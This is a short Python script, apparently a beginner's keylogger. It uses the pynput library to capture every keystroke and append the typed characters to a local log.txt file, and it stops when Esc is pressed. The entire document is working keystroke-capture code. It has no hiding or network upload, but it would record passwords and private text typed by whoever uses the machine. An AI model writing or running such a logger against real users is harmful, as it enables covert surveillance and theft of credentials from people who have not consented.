# Import pynput for the Keys
import pynput

from pynput.keyboard import Key, Controller, Listener

count = 0
keys = []

# If a key is pressed this code will run
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

# If a key is released this code will run
def on_release(key):
    if key == Key.esc:
        return False

# The code for write the file
def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()